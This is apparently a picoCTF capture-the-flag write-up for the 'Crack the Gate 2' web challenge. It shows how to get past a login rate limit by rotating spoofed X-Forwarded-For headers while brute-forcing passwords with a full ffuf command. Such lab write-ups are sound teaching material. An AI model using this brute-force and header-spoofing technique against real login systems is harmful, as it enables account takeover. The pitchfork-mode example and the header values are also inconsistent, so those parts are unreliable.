<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Web Exploitation – Easy</title>
  <link rel="stylesheet" href="../css/writeup.css">

</head>

<body>
  <div class="writeup-layout">

    <!-- ===== SIDEBAR ===== -->
    <aside class="sidebar">
      <h2>Web Exploitation</h2>
      <h3><a href="../WebExDesc.html">Web Exploitation Overview</a>
</h3>
      <details closed>
  <summary>Easy Challenges</summary>
  <ul>
    <li><a href="../Easy/Crack_the_Gate_1.html">Crack the Gate 1</a></li>
    <li><a href="coming_soon.html">SSTI1</a></li>
    <li><a href="coming_soon.html">n0s4n1ty 1</a></li>
    <li><a href="../Easy/Cookie_Monster.html">Cookie Monster Secret Recipe</a></li>
    <li><a href="../Easy/Web_Decoder.html">WebDecode</a></li>
    <li><a href="../Easy/Unminify.html">Unminify</a></li>
    <li><a href="../Easy/introtoburpsuite.html">IntroToBurp</a></li>
    <li><a href="../Easy/Bookmarklet.html">Bookmarklet</a></li>
    <li><a href="../Easy/Local_Authority.html">Local Authority</a></li>
    <li><a href="../Easy/Inspect_HTML.html">Inspect HTML</a></li>
    <li><a href="../Easy/Includes.html">Includes</a></li>
    <li><a href="../Easy/Cookie.html">Cookies</a></li>
    <li><a href="../Easy/Scavenger_Hunt.html">Scavenger Hunt</a></li>
    <li><a href="../Easy/Get_aHead.html">GET aHEAD</a></li>
    <li><a href="../Easy/dont_use_client_side.html">dont-use-client-side</a></li>
    <li><a href="../Easy/logon.html">logon</a></li>
    <li><a href="../Easy/Insp3ct0r.html">Insp3ct0r</a></li>
    <li><a href="../Easy/where_are_the_robots.html">where are the robots</a></li>
  </ul>
</details>

    <details open>
  <summary>Medium Challenges</summary>
  <ul>
    <li><a href="Crack_the_Gate_2.html">Crack the Gate 2</a></li>
    <li><a href="">byp4ss3d</a></li>
    <li><a href="">Pachinko</a></li>
    <li><a href="">SSTI 2</a></li>
    <li><a href="../Medium/3v@l.html">3v@l</a></li>
    <li><a href="">WebSockFish</a></li>
    <li><a href="">ApritiSesamo</a></li>
    <li><a href="">Trickster</a></li>
    <li><a href="No_SQL_Injection.html">No Sql Injection</a></li>
    <li><a href="">SOAP</a></li>
    <li><a href="More_SQLi.html">More SQLi</a></li>
    <li><a href="MatchTheRegex.html">MatchTheRegex</a></li>
    <li><a href="">Java Code Analysis!?!</a></li>
    <li><a href="">findme</a></li>
    <li><a href="">SQLiLite</a></li>
    <li><a href="">SQL Direct</a></li>
    <li><a href="Secrets.html">Secrets</a></li>
    <li><a href="">Search Source</a></li>
    <li><a href="Roboto_Sans.html">Roboto Sans</a></li>
    <li><a href="Power_Cookie.html">Power Cookie</a></li>
    <li><a href="Forbidden_Paths.html">Forbidden Paths</a></li>
    <li><a href="">JAuth</a></li>
    <li><a href="">caas</a></li>
    <li><a href="">login</a></li>
    <li><a href="SuperSerial.html">Super Serial</a></li>
    <li><a href="">Most Cookies</a></li>
    <li><a href="">Web Gauntlet 2</a></li>
    <li><a href="">Some Assembly Required 1</a></li>
    <li><a href="">Who are you?</a></li>
    <li><a href="">Some Assembly Required 2</a></li>
    <li><a href="">Web Gauntlet 3</a></li>
    <li><a href="">More Cookies</a></li>
    <li><a href="">It is my Birthday</a></li>
    <li><a href="">Startup Company</a></li>
    <li><a href="">Web Gauntlet</a></li>
    <li><a href="Irish-Name-Repo_1.html">Irish-Name-Repo 1</a></li>
    <li><a href="Irish-Name-Repo_2.html">Irish-Name-Repo 2</a></li>
    <li><a href="">Irish-Name-Repo 3</a></li>
    <li><a href="">Client-side-again</a></li>
    <li><a href="">picobrowser</a></li>
  </ul>
</details>

    <details closed>
  <summary>Hard Challenges</summary>
  <ul>
    <li><a href="">secure-email-service</a></li>
    <li><a href="">Pachinko Revisited</a></li>
    <li><a href="">elements</a></li>
    <li><a href="">msfroggenerator2</a></li>
    <li><a href="">cancri-sp</a></li>
    <li><a href="">noted</a></li>
    <li><a href="">Live Art</a></li>
    <li><a href="">notepad</a></li>
    <li><a href="">Bithug</a></li>
    <li><a href="">X marks the spot</a></li>
    <li><a href="">Some Assembly Required 3</a></li>
    <li><a href="">Some Assembly Required 4</a></li>
    <li><a href="">Java Script Kiddie</a></li>
    <li><a href="">Java Script Kiddie 2</a></li>
  </ul>
</details>

      <a class="back-home" href="../../index.html">← Back to Index</a>
    </aside>

    <!-- ===== CONTENT ===== -->
    <main class="content">
      <section id="challenge1">
        <h1>Crack the Gate 2 (Medium)</h1>
        <ul>
          <li>Challenge Link: https://play.picoctf.org/practice/challenge/521</li>
          <li>Challenge Description: The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.</li>
          <li>Hints:</li>
          <ol>
            <li>What IP does the server think you’re coming from?</li>
            <li>X-forwarded-For</li>
            <li>You can rotate fake IPs to bypass rate limits.</li>
          </ol>
        </ul>
      </section>

      <section>
        <h1>Solution</h1>
        <p>We are given as password list with a username. We can try each password but after 2 failed attempts it locks us out for 20 minutes, which is over the 15 minute we are given. So we must solve this under that time. So we need to bypass the rate-limiting, which is number of requests a user or client can make to a service in a specific time period. We can bypass it with the X-Forwarded-For header.
          <br><br>X-Forwarded-For header: an HTTP request header commonly added by proxies, load balancers, CDNs, and reverse proxies. It represents the original client’s IP address before the request passed through intermediate systems. Allow servers to know the true client IP for logging, security, rate limiting, geolocation, etc.
          <br><br>Example: X-Forwarded-For: 203.0.113.5, 10.0.1.2, 10.0.1.3
        </p>
        <ul>
          <li>The left-most value is the original client IP.</li>
          <li>The right-most values are added by each proxy in the chain.</li>
        </ul>
        <p>We can take advantage of X-Forwarded-For header because if the application blindly trusts this header, then that means that we can:</p>
        <ul>
          <li>Bypassing rate‑limits</li>
          <li>Evading IP blacklists</li>
          <li>Hiding the real origin of attacks</li>
        </ul>
        <p>We can use FFuF, a fuzzing tool to perform the brute force attack. Before we use the FFuF command, we need to create a list of numbers so we can give different IP addresses for the X-Forwarded-For header:</p>
        <pre>cat passwords.txt</pre>
        <img src="../Images/CTG2/CTG2wget.png" a="wget">
        <br>
        <img src="../Images/CTG2/CTG2Passwordtxt.png" a="password list">
        <p>Then using wc (word count), there is 20 passwords in this list. Next, to create a file containing the numbers 1 through 20, one per line.</p>
        <pre>seq 1 20 > numbers.txt</pre>
        <p>Preparations are set, now using the fuzzing tool:</p>
        <pre>ffuf -X POST -d '{"email":"ctf-player@picoctf.org","password":"FUZZ2"}' -H "Content-Type: application/json" -H "X-Forwarded-For: 10.10.10.FUZZ1" -u http://amiable-citadel.picoctf.net:62495/login -w ./passwords.txt:FUZZ2 -w ./numbers.txt:FUZZ1 -mc all -mode pitchfork</pre>
        <ul>
          <li>-X POST: This tells ffuf to use the POST HTTP method for each request. The default is GET, so this overrides it.</li>
          <li>-d '{"email":"ctf-player@picoctf.org","password":"FUZZ2"}': sets the request body</li>
        </ul>
        <pre>"email": "ctf-player@picoctf.org","password": "FUZZ2"
FUZZ2 is a placeholder that ffuf will replace using a wordlist (defined later).
        </pre>
        <ul>
          <li>-H "Content-Type: application/json": Adds an HTTP header to all requests:</li>
        </ul>
        <pre>Content-Type: application/json</pre>
        <ul>
          <li>-H "X-Forwarded-For: 127.FUZZ1.1.1": This adds another header:</li>
        </ul>
        <pre>X-Forwarded-For: 10.10.10.<something>
FUZZ1 will be replaced by entries from another wordlist
        </pre>
        <ul>
          <li>-u http://amiable-citadel.picoctf.net:62495/login: The URL ffuf will send requests to.</li>
          <li>-w ./passwords.txt:FUZZ2 : A wordlist, but mapped to a specific placeholder name. Every line in passwords.txt replaces FUZZ2</li>
          <li>-w ./numbers.txt:FUZZ1 : A second wordlist, mapped to FUZZ1, used inside the X‑Forwarded‑For header.</li>
        </ul>
        <pre>
Example: if numbers.txt contains:
1
2
3

then ffuf produces:
X-Forwarded-For: 10.10.10.1
X-Forwarded-For: 10.10.10.2
X-Forwarded-For: 10.10.10.3
        </pre>
        <p>-mc all: match codes, ffuf should display all HTTP status codes, not filter any out. -mode pitchfork: This tells ffuf how to synchronize multiple wordlists, matches wordlist 1, line 1 with wordlist 2, line 1.</p>
        <pre>
passwords.txt
pass1
pass2
pass3

numbers.txt
1
2
3

Output pair
password=pass1, XFF=10.10.10.1
password=pass1, XFF=10.10.10.2
password=pass1, XFF=10.10.10.3
        </pre>
        <img src="../Images/CTG2/CTG2ffuf.png" a="ctg2ffuf">
        <p>Now we get a response from the application, but notice that for one of the passwords, the response size is different than the others. That is our password for the account.</p>
      </section>

      <section>
        <h1>Sources</h1>
        <ul>
          <li><a href="https://www.typeerror.org/docs/http/headers/x-forwarded-for">X-Forwarded-For</a></li>
          <li><a href="https://httptoolkit.com/blog/what-is-x-forwarded-for/">Dangers of X-Forwarded-For</a></li>
          <li><a href="https://hackviser.com/tactics/tools/ffuf">Hackviser - FFUF</a></li>
        </ul>
      </section>

    </main>
  </div>
</body>
</html>
